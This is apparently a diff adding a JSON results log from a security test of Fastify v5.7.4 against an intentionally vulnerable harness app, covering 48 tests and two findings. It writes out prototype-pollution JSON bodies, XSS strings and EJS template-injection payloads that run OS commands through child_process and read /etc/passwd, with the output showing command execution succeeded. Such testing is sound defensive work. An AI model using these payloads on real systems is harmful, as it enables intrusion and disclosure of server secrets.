@@ -1,0 +1,389 @@
+{
+  "phase": 3,
+  "title": "Prototype Pollution & Injection Attacks",
+  "target": "Fastify v5.7.4",
+  "timestamp": "2026-02-18T20:38:46Z",
+  "tests": [
+    {
+      "id": 1,
+      "name": "JSON-PP-__proto__ direct",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"__proto__\": {\"polluted\": true}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 2,
+      "name": "JSON-PP-__proto__ unicode",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"polluted\": true}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 3,
+      "name": "JSON-PP-__proto__ mixed unicode",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"\\u005F\\u005Fproto\\u005F\\u005F\": {\"polluted\": true}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 4,
+      "name": "JSON-PP-constructor.prototype",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"constructor\": {\"prototype\": {\"polluted\": true}}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 5,
+      "name": "JSON-PP-constructor unicode",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"\\u0063onstructor\": {\"\\u0070rototype\": {\"polluted\": true}}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 6,
+      "name": "JSON-PP-__proto__ in array",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "[{\"__proto__\": {\"polluted\": true}}]",
+        "status": 400
+      }
+    },
+    {
+      "id": 7,
+      "name": "JSON-PP-deep nested __proto__",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"a\": {\"b\": {\"__proto__\": {\"polluted\": true}}}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 8,
+      "name": "JSON-PP-duplicate with __proto__",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"clean\": true, \"__proto__\": {\"polluted\": true}, \"clean\": false}",
+        "status": 400
+      }
+    },
+    {
+      "id": 9,
+      "name": "JSON-PP-toString pollution",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"__proto__\": {\"toString\": \"hijacked\"}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 10,
+      "name": "JSON-PP-hasOwnProperty attack",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"__proto__\": {\"hasOwnProperty\": \"hijacked\"}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 11,
+      "name": "JSON-PP-mixed legitimate+proto",
+      "category": "proto-pollution",
+      "result": "400",
+      "details": {
+        "payload_preview": "{\"username\": \"test\", \"email\": \"t@t.com\", \"__proto__\": {\"isAdmin\": true}}",
+        "status": 400
+      }
+    },
+    {
+      "id": 12,
+      "name": "JSON-PP-verify-clean",
+      "category": "proto-pollution",
+      "result": "clean"
+    },
+    {
+      "id": 13,
+      "name": "YAML-PP-__proto__.polluted",
+      "category": "proto-pollution",
+      "result": "200"
+    },
+    {
+      "id": 14,
+      "name": "YAML-PP-constructor.prototype",
+      "category": "proto-pollution",
+      "result": "200"
+    },
+    {
+      "id": 15,
+      "name": "YAML-PP-Nested proto via dots",
+      "category": "proto-pollution",
+      "result": "200"
+    },
+    {
+      "id": 16,
+      "name": "YAML-PP-Proto with space",
+      "category": "proto-pollution",
+      "result": "200"
+    },
+    {
+      "id": 17,
+      "name": "YAML-PP-deepmerge",
+      "category": "proto-pollution",
+      "result": "200"
+    },
+    {
+      "id": 18,
+      "name": "YAML-PP-verify",
+      "category": "proto-pollution",
+      "result": "tested"
+    },
+    {
+      "id": 19,
+      "name": "Merge-PP-__proto__ via JSON",
+      "category": "proto-pollution",
+      "result": "400"
+    },
+    {
+      "id": 20,
+      "name": "Merge-PP-constructor.prototype via JSON",
+      "category": "proto-pollution",
+      "result": "400"
+    },
+    {
+      "id": 21,
+      "name": "Assign-PP",
+      "category": "proto-pollution",
+      "result": "400"
+    },
+    {
+      "id": 22,
+      "name": "Spread-PP",
+      "category": "proto-pollution",
+      "result": "400"
+    },
+    {
+      "id": 23,
+      "name": "SSTI-direct-Math expression",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%= 7*7 %>",
+        "response_preview": "{\"rendered\":\"49\"}"
+      }
+    },
+    {
+      "id": 24,
+      "name": "SSTI-direct-Process.env",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%= JSON.stringify(Object.keys(process.env)) %>",
+        "response_preview": "{\"rendered\":\"[&#34;COLORFGBG&#34;,&#34;COLORTERM&#34;,&#34;COMMAND_NOT_FOUND_INSTALL_PROMPT&#34;,&#34;DBUS_SESSION_BUS_ADDRESS&#34;,&#34;DESKTOP_SESSION&#34;,&#34;DISPLAY&#34;,&#34;DOTNET_CLI_TELEMETR"
+      }
+    },
+    {
+      "id": 25,
+      "name": "SSTI-direct-Process.cwd",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%= process.cwd() %>",
+        "response_preview": "{\"rendered\":\"/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/testapp\"}"
+      }
+    },
+    {
+      "id": 26,
+      "name": "SSTI-direct-require child_process",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%= require('child_process').execSync('id').toString() %>",
+        "response_preview": "{\"error\":\"ejs:1\\n >> 1| <%= require('child_process').execSync('id').toString() %>\\n\\nrequire is not defined\"}"
+      }
+    },
+    {
+      "id": 27,
+      "name": "SSTI-direct-Global process",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%= global.process.mainModule.require('child_process').execSync('whoami').toString() %>",
+        "response_preview": "{\"rendered\":\"svc\\n\"}"
+      }
+    },
+    {
+      "id": 28,
+      "name": "SSTI-direct-File read /etc/passwd",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%= require('fs').readFileSync('/etc/passwd','utf8').substring(0,50) %>",
+        "response_preview": "{\"error\":\"ejs:1\\n >> 1| <%= require('fs').readFileSync('/etc/passwd','utf8').substring(0,50) %>\\n\\nrequire is not defined\"}"
+      }
+    },
+    {
+      "id": 29,
+      "name": "SSTI-direct-Unescaped output",
+      "category": "ssti",
+      "result": "200",
+      "details": {
+        "template": "<%- '<script>alert(1)</script>' %>",
+        "response_preview": "{\"rendered\":\"<script>alert(1)</script>\"}"
+      }
+    },
+    {
+      "id": 30,
+      "name": "SSTI-context-Override appName",
+      "category": "ssti",
+      "result": "200"
+    },
+    {
+      "id": 31,
+      "name": "SSTI-context-settings injection",
+      "category": "ssti",
+      "result": "200"
+    },
+    {
+      "id": 32,
+      "name": "SSTI-context-delimiter injection",
+      "category": "ssti",
+      "result": "200"
+    },
+    {
+      "id": 33,
+      "name": "XSS-greet-<script>alert(1)</sc",
+      "category": "xss",
+      "result": "200"
+    },
+    {
+      "id": 34,
+      "name": "XSS-greet-<img src=x onerror=a",
+      "category": "xss",
+      "result": "200"
+    },
+    {
+      "id": 35,
+      "name": "XSS-greet-{{7*7}}",
+      "category": "xss",
+      "result": "200"
+    },
+    {
+      "id": 36,
+      "name": "XSS-greet-<%= 7*7 %>",
+      "category": "xss",
+      "result": "200"
+    },
+    {
+      "id": 37,
+      "name": "EJS-PP-RCE-chain",
+      "category": "pp-rce",
+      "result": "200"
+    },
+    {
+      "id": 38,
+      "name": "EJS-PP-RCE-yaml-targeted",
+      "category": "pp-rce",
+      "result": "tested"
+    },
+    {
+      "id": 39,
+      "name": "WS-normal-echo",
+      "category": "websocket",
+      "result": "ok"
+    },
+    {
+      "id": 40,
+      "name": "WS-proto-injection",
+      "category": "websocket",
+      "result": "tested"
+    },
+    {
+      "id": 41,
+      "name": "WS-constructor-injection",
+      "category": "websocket",
+      "result": "tested"
+    },
+    {
+      "id": 42,
+      "name": "WS-large-payload",
+      "category": "websocket",
+      "result": "ok"
+    },
+    {
+      "id": 43,
+      "name": "WS-invalid-json",
+      "category": "websocket",
+      "result": "ok"
+    },
+    {
+      "id": 44,
+      "name": "WS-xss",
+      "category": "websocket",
+      "result": "ok"
+    },
+    {
+      "id": 45,
+      "name": "XML-XXE external entity",
+      "category": "xml-injection",
+      "result": "200"
+    },
+    {
+      "id": 46,
+      "name": "XML-XXE SSRF",
+      "category": "xml-injection",
+      "result": "200"
+    },
+    {
+      "id": 47,
+      "name": "XML-Billion laughs",
+      "category": "xml-injection",
+      "result": "200"
+    },
+    {
+      "id": 48,
+      "name": "XML-XSS in XML",
+      "category": "xml-injection",
+      "result": "200"
+    }
+  ],
+  "findings": [
+    {
+      "id": "P3-F-SSTI-01",
+      "severity": "CRITICAL",
+      "title": "SSTI \u2192 RCE via direct EJS.render() with user template",
+      "description": "/view/direct passes user-controlled template string to EJS.render(), allowing arbitrary code execution including OS commands, file reads, and process info disclosure. This is app-level misuse (not framework bug).",
+      "impact": "Full RCE on server",
+      "note": "This is an intentional test harness vulnerability, not a Fastify/EJS framework bug. Similar to Express assessment finding."
+    },
+    {
+      "id": "P3-F02",
+      "severity": "LOW",
+      "title": "WebSocket uses JSON.parse instead of secure-json-parse",
+      "description": "The WebSocket handler at /ws uses standard JSON.parse() for incoming messages, not secure-json-parse. While JSON.parse itself doesn't cause prototype pollution (it uses Object.defineProperty), if the parsed data is later spread/merged into other objects, there is a risk.",
+      "note": "This is an app-level issue (test harness code), not a framework vulnerability."
+    }
+  ],
+  "anomalies": [],
+  "total_tests": 48,
+  "total_findings": 2,
+  "total_anomalies": 0
+}
